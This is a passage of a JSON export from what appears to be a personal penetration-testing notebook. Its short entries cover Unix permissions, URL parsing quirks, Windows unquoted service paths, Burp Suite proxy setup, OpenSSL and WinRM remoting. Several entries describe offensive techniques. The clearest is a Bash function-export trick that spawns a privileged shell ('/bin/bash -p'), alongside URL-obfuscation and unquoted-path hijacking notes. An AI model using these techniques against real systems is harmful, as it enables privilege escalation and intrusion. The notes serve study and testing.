stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;em&gt;Only&lt;/em&gt; applied to directories. A file in a directory with the sticky bit set can only be deleted by its owner (and root). For example, /tmp always has the sticky bit set.&lt;/p&gt;\n&lt;h2 id=&quot;write-permissions-and-directories&quot;&gt;Write permissions and directories&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#write-permissions-and-directories&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;If a user has &lt;em&gt;write&lt;/em&gt; access to a directory, then they can write to any file they have at least &lt;em&gt;read&lt;/em&gt; access to (!!!).&lt;/p&gt;"},"spells/Uniform-resource-locators":{"slug":"spells/Uniform-resource-locators","filePath":"spells/Uniform resource locators.md","title":"Uniform resource locators (URLs)","links":["spells/IPv4"],"tags":["Standard/URI"],"content":"scheme: // user:pass @ host:port        /some/path   ?a=multi&amp;part=query #fragment\n  http: // foo:P4s$  @ example.com:8080 /also/a/path ?id=1&amp;task=2        #some_ref\n\n\nIf the // is  absent, then the URI is considered non-hierarchical, and the interpretation of all data after the scheme: is left up to the handling client. In practice, most clients follow the conventions used for hierarchical URIs.\nThe //, @, #, and ? are separators. Thus, for example, example.com&amp;foo=bar@167772161/ actually points to 10.0.0.1 (in decimal format), with example.com&amp;foo=bar being interpreted as a username to be used for any prospective authentication!\nAccording to the relevant RFC, the host must be either a valid domain name or canonical IPv4 or (bracket enclosed) IPv6 address. However, most parsing libraries will accept decimal, octal, hexadecimal, and even mixed-format IP addresses!\nWhile the query string is typical represented as a series of &amp;-delimited key/value pairs, this is actually an arbitrary string whose interpretation is left up to the server.\nThe fragment is also an arbitrary string, but whose interpretation is left up to the client (and is not supposed to be sent to the server).\n","richContent":"&lt;pre&gt;&lt;code&gt;scheme: // user:pass @ host:port        /some/path   ?a=multi&amp;#x26;part=query #fragment\n  http: // foo:P4s$  @ example.com:8080 /also/a/path ?id=1&amp;#x26;task=2        #some_ref\n&lt;/code&gt;&lt;/pre&gt;\n&lt;ul&gt;\n&lt;li&gt;If the &lt;code&gt;//&lt;/code&gt; is  absent, then the URI is considered &lt;em&gt;non-hierarchical&lt;/em&gt;, and the interpretation of all data after the &lt;code&gt;scheme:&lt;/code&gt; is left up to the handling client. In practice, most clients follow the conventions used for hierarchical URIs.&lt;/li&gt;\n&lt;li&gt;The &lt;code&gt;//&lt;/code&gt;, &lt;code&gt;@&lt;/code&gt;, &lt;code&gt;#&lt;/code&gt;, and &lt;code&gt;?&lt;/code&gt; are &lt;em&gt;separators&lt;/em&gt;. Thus, for example, &lt;code&gt;http://example.com&amp;#x26;foo=bar@167772161/&lt;/code&gt; &lt;em&gt;actually&lt;/em&gt; points to 10.0.0.1 (in decimal format), with &lt;code&gt;example.com&amp;#x26;foo=bar&lt;/code&gt; being interpreted as a &lt;em&gt;username&lt;/em&gt; to be used for any prospective authentication!&lt;/li&gt;\n&lt;li&gt;According to the relevant RFC, the &lt;code&gt;host&lt;/code&gt; must be either a valid domain name or canonical &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/IPv4&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/IPv4&quot;&gt;IPv4&lt;/a&gt; or (bracket enclosed) IPv6 address. However, most parsing libraries will accept decimal, octal, hexadecimal, and even mixed-format IP addresses!&lt;/li&gt;\n&lt;li&gt;While the query string is typical represented as a series of &lt;code&gt;&amp;#x26;&lt;/code&gt;-delimited key/value pairs, this is actually an arbitrary string whose interpretation is left up to the &lt;em&gt;server&lt;/em&gt;.&lt;/li&gt;\n&lt;li&gt;The fragment is also an arbitrary string, but whose interpretation is left up to the &lt;em&gt;client&lt;/em&gt; (and is &lt;em&gt;not&lt;/em&gt; supposed to be sent to the server).&lt;/li&gt;\n&lt;/ul&gt;"},"spells/Unquoted-path-handling-in-Windows":{"slug":"spells/Unquoted-path-handling-in-Windows","filePath":"spells/Unquoted path handling in Windows.md","title":"Unquoted path handling in Windows","links":[],"tags":["OS/Windows","AttackCycle/Exploitation"],"content":"When Windows encounters an unquoted path it tries all possible paths, from shortest to longest. Thus C:\\Program Files\\Application Path\\App.exe will cause Windows to look for the following executables, in order:\n\nC:\\Program.exe\nC:\\Program Files\\Application.exe\nC:\\Program Files\\Application Path\\App.exe\n\nIf an executable is found on a shorter path, then the remainder of the (unquoted) path is treated as command line parameters.","richContent":"&lt;p&gt;When Windows encounters an unquoted path it tries &lt;em&gt;all&lt;/em&gt; possible paths, from shortest to longest. Thus &lt;code&gt;C:\\Program Files\\Application Path\\App.exe&lt;/code&gt; will cause Windows to look for the following executables, in order:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;C:\\Program.exe&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;C:\\Program Files\\Application.exe&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;C:\\Program Files\\Application Path\\App.exe&lt;/code&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;If an executable is found on a shorter path, then the remainder of the (unquoted) path is treated as command line parameters.&lt;/p&gt;"},"spells/Upgrade-PostgreSQL":{"slug":"spells/Upgrade-PostgreSQL","filePath":"spells/Upgrade PostgreSQL.md","title":"Upgrade PostgreSQL","links":[],"tags":["Application/PostgreSQL","HowTo"],"content":"sudo -u postgres pg_dropcluster --stop $NEW_VER main\nsudo -u postgres pg_upgradecluster $OLD_VER main\nsudo -u postgres pg_dropcluster --stop $OLD_VER main\nWhere $OLD_VER and $NEW_VER are the old and new major version numbers (e.g., 13 and 14).","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; postgres&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; pg_dropcluster&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --stop&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $NEW_VER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; main&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; postgres&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; pg_upgradecluster&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $OLD_VER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; main&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; postgres&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; pg_dropcluster&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --stop&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $OLD_VER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; main&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Where &lt;code&gt;$OLD_VER&lt;/code&gt; and &lt;code&gt;$NEW_VER&lt;/code&gt; are the old and new major version numbers (e.g., &lt;a href=&quot;https://www.netvizura.com/blog/how-to-upgrade-postgresql-from-13-to-14&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;13 and 14&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;).&lt;/p&gt;"},"spells/Use-Bash-functions-to-backdoor-executables":{"slug":"spells/Use-Bash-functions-to-backdoor-executables","filePath":"spells/Use Bash functions to backdoor executables.md","title":"Use Bash functions to “backdoor” executables","links":[],"tags":["Language/Bash","AttackCycle/Exploitation","AttackCycle/PrivEsc","HowTo"],"content":"\n\n                  \n                  Important\n                  \n                \n\n\nThis only works on versions of Bash before v4.2-048!\n\n\n\nIn versions of Bash &lt; 4.2-048, it’s possible to export functions with the same form as absolute paths to files. These functions will then be executed instead of the fully-specified path if the calling application is relying on the current shell for helper execution.\nFor example:\nfunction /path/to/executable { /bin/bash -p; }\nexport -f /path/to/executable","richContent":"&lt;blockquote class=&quot;callout important&quot; data-callout=&quot;important&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Important&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;This only works on versions of Bash &lt;em&gt;before&lt;/em&gt; v4.2-048!&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;In versions of Bash &amp;#x3C; 4.2-048, it’s possible to export functions with the same form as absolute paths to files. These functions will then be executed instead of the fully-specified path &lt;em&gt;if&lt;/em&gt; the calling application is relying on the current shell for helper execution.&lt;/p&gt;\n&lt;p&gt;For example:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;function&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; /path/to/executable&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; /bin/bash&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; }&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;export&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;path&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;to&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;executable&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Use-Burp-Suite-with-Firefox":{"slug":"spells/Use-Burp-Suite-with-Firefox","filePath":"spells/Use Burp Suite with Firefox.md","title":"Use Burp Suite with Firefox","links":["spells/Burp-Suite","spells/HTTP","spells/Use-a-Raspberry-Pi-4B-as-hacking-accessory"],"tags":["Application/BurpSuite","Application/Firefox","OS/Linux/Distros/Kali","HowTo"],"content":"\n\n                  \n                  Tip\n                  \n                \n\n\nI strongly recommend using the built-in Burp Suite Browser, since it already has proxy and SSL interception set up. Also, it’s always best to keep your “hacker” and “normie” tools/identities as separate as possible!\nThat said… The Burp Suite browser is compiled as an x86_64 binary on Linux, and thus doesn’t work on a Raspberry Pi or in a Linux VM running on M-series Apple devices. So it’s likely that you’ll run into situations where you’ll still need to use Firefox.\n\n\n\nFirst, make the following changes to Firefox’s settings:\n\nSettings → General → Network Settings → Settings… → Manual proxy configuration → (Set the “HTTP Proxy” to 127.0.0.1:8080 and check “Also use this proxy for HTTPS”)\nSettings → Privacy &amp; Security → Browser Privacy → Logins and Passwords → Ask to save logins and passwords for websites → Off\nSettings → Privacy &amp; Security → Browser Privacy → History → Use custom settings for history → Always use private browsing mode → On\n\nThen install the Burp Suite CA certificate:\n\nStart Burp Suite.\nGo to http://127.0.0.1:8080.\nClick on the “CA Certificate” link in the upper right to download Burp Suite’s certificate.\nGo to Settings → Privacy &amp; Security → Security → Certificates → View Certificates…\nImport the Burp Suite CA certificate and check “Trust this CA to identify websites.”\n\nIt’s also possible to use FoxyProxy — set up Burp Suite as a togglable proxy and then import the Burp Suite CA certificate as above. I don’t like this option because I think that hacking and normal browsing activities should be kept as separate as possible.\nUsing Chromium on the Raspberry Pi as the Burp Suite browser might be the best option, as it aligns more with Burp Suite’s built-in (x86_64) browser. Unfortunately, Chromium’s certificate import functionality appears to be broken on Kali Linux ARM right now.","richContent":"&lt;blockquote class=&quot;callout tip&quot; data-callout=&quot;tip&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Tip&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;I &lt;em&gt;strongly&lt;/em&gt; recommend using the built-in &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Burp-Suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Burp-Suite&quot;&gt;Burp Suite&lt;/a&gt; Browser, since it already has proxy and SSL interception set up. Also, it’s always best to keep your “hacker” and “normie” tools/identities as separate as possible!&lt;/p&gt;\n&lt;p&gt;&lt;em&gt;That said…&lt;/em&gt; The &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Burp-Suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Burp-Suite&quot;&gt;Burp Suite&lt;/a&gt; browser is compiled as an x86_64 binary on Linux, and thus &lt;em&gt;doesn’t&lt;/em&gt; work on a Raspberry Pi or in a Linux VM running on M-series Apple devices. So it’s likely that you’ll run into situations where you’ll still need to use Firefox.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;First, make the following changes to Firefox’s settings:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Settings → General → Network Settings → Settings… → Manual proxy configuration → (Set the “&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/HTTP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/HTTP&quot;&gt;HTTP&lt;/a&gt; Proxy” to 127.0.0.1:8080 and check “Also use this proxy for HTTPS”)&lt;/li&gt;\n&lt;li&gt;Settings → Privacy &amp;#x26; Security → Browser Privacy → Logins and Passwords → Ask to save logins and passwords for websites → Off&lt;/li&gt;\n&lt;li&gt;Settings → Privacy &amp;#x26; Security → Browser Privacy → History → Use custom settings for history → Always use private browsing mode → On&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Then install the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Burp-Suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Burp-Suite&quot;&gt;Burp Suite&lt;/a&gt; CA certificate:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Start &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Burp-Suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Burp-Suite&quot;&gt;Burp Suite&lt;/a&gt;.&lt;/li&gt;\n&lt;li&gt;Go to &lt;a href=&quot;http://127.0.0.1:8080&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;http://127.0.0.1:8080&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/li&gt;\n&lt;li&gt;Click on the “CA Certificate” link in the upper right to download &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Burp-Suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Burp-Suite&quot;&gt;Burp Suite&lt;/a&gt;’s certificate.&lt;/li&gt;\n&lt;li&gt;Go to Settings → Privacy &amp;#x26; Security → Security → Certificates → View Certificates…&lt;/li&gt;\n&lt;li&gt;Import the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Burp-Suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Burp-Suite&quot;&gt;Burp Suite&lt;/a&gt; CA certificate and check “Trust this CA to identify websites.”&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;It’s also possible to use &lt;a href=&quot;https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-basic/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;FoxyProxy&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; — set up &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Burp-Suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Burp-Suite&quot;&gt;Burp Suite&lt;/a&gt; as a togglable proxy and then import the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Burp-Suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Burp-Suite&quot;&gt;Burp Suite&lt;/a&gt; CA certificate as above. I don’t like this option because I think that hacking and normal browsing activities should be kept as separate as possible.&lt;/p&gt;\n&lt;p&gt;Using Chromium on &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Use-a-Raspberry-Pi-4B-as-hacking-accessory&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Use-a-Raspberry-Pi-4B-as-hacking-accessory&quot;&gt;the Raspberry Pi&lt;/a&gt; as the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Burp-Suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Burp-Suite&quot;&gt;Burp Suite&lt;/a&gt; browser might be the best option, as it aligns more with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Burp-Suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Burp-Suite&quot;&gt;Burp Suite&lt;/a&gt;’s built-in (x86_64) browser. Unfortunately, Chromium’s certificate import functionality appears to be broken on Kali Linux ARM right now.&lt;/p&gt;"},"spells/Use-Burp-Suite-with-mobile-apps":{"slug":"spells/Use-Burp-Suite-with-mobile-apps","filePath":"spells/Use Burp Suite with mobile apps.md","title":"Use Burp Suite with mobile apps","links":["spells/Burp-Suite","spells/HTTP"],"tags":["Application/BurpSuite","HowTo"],"content":"You can proxy mobile API requests through Burp Suite too.\n\nConfigure Burp Suite to listen on all interfaces.\nAdd your computer as an HTTP proxy to the network interface on the mobile device.\nAdd the Burp Suite CA using more-or-less the same process as would be used for Firefox (above).\n\nBe aware that this proxies all device traffic through Burp Suite.","richContent":"&lt;p&gt;&lt;a href=&quot;https://portswigger.net/support/configuring-an-ios-device-to-work-with-burp&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;You can proxy mobile API requests through Burp Suite too.&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Configure &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Burp-Suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Burp-Suite&quot;&gt;Burp Suite&lt;/a&gt; to listen on all interfaces.&lt;/li&gt;\n&lt;li&gt;Add your computer as an &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/HTTP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/HTTP&quot;&gt;HTTP&lt;/a&gt; proxy to the network interface on the mobile device.&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://portswigger.net/support/installing-burp-suites-ca-certificate-in-an-ios-device&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Add the Burp Suite CA using more-or-less the same process as would be used for Firefox (above).&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Be aware that this proxies &lt;em&gt;all&lt;/em&gt; device traffic through &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Burp-Suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Burp-Suite&quot;&gt;Burp Suite&lt;/a&gt;.&lt;/p&gt;"},"spells/Use-OpenSSL-to-encrypt-and-decrypt-files":{"slug":"spells/Use-OpenSSL-to-encrypt-and-decrypt-files","filePath":"spells/Use OpenSSL to encrypt and decrypt files.md","title":"Use OpenSSL to encrypt and decrypt files","links":[],"tags":["HowTo","Application/OpenSSL","Cryptography/Cryptosystems/RSA"],"content":"To encrypt a file:\nopenssl rsa -in $FILE -aes256 -out $CRYPTOFILE\nTo decrypt a file:\nopenssl rsa -in $CRYPTOFILE -out $FILE","richContent":"&lt;p&gt;To encrypt a file:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;openssl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; rsa&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -aes256&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -out&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $CRYPTOFILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;To decrypt a file:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;openssl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; rsa&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $CRYPTOFILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -out&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $FILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Use-WinRM-with-PowerShell":{"slug":"spells/Use-WinRM-with-PowerShell","filePath":"spells/Use WinRM with PowerShell.md","title":"Use WinRM with PowerShell","links":[],"tags":["HowTo","Protocol/WinRM","Application/PowerShell","OS/Windows"],"content":"Many large companies will enable PowerShell remoting on all machines in order to ease IT support burdens (by default, remoting is only enabled on domain controllers).\n# Create PSCredential object for authentication.\n#\n$username = &quot;$TARGET_USER&quot;;\n$password = &quot;$TARGET_PASSWORD&quot;;\n$SECURE_PASSWORD = ConvertTo-SecureString &quot;$TARGET_PASSWORD&quot; `\n                                          -AsPlainText -Force;\n$CREDENTIAL_OBJECT = New-Object `\n                   System.Management.Automation.PSCredential `\n                   $TARGET_USER, $SECURE_PASSWORD;\n \n# Enter an interactive PowerShell session on the $TARGET_HOST.\n#\nEnter-PSSession -ComputerName $TARGET_HOST `\n                -Credential $CREDENTIAL_OBJECT\n \n# Alternately, we can pass commands directly as &quot;script\n# blocks&quot;. Note that the $POWERSHELL_SCRIPT does not have\n# access to any variables in the host script or session, as\n# its sent to $TARGET_HOST for execution (though this can be\n# worked around using the -ArgumentList parameter, if\n# necessary).\n#\nInvoke-Command -ComputerName $TARGET_HOST `\n               -Credential $CREDENTIAL_OBJECT `\n               -ScriptBlock {\n                    $POWERSHELL_SCRIPT\n                }","richContent":"&lt;p&gt;Many large companies will enable PowerShell remoting on all machines in order to ease IT support burdens (by default, remoting is only enabled on domain controllers).&lt;/p&gt;\n&lt;figure 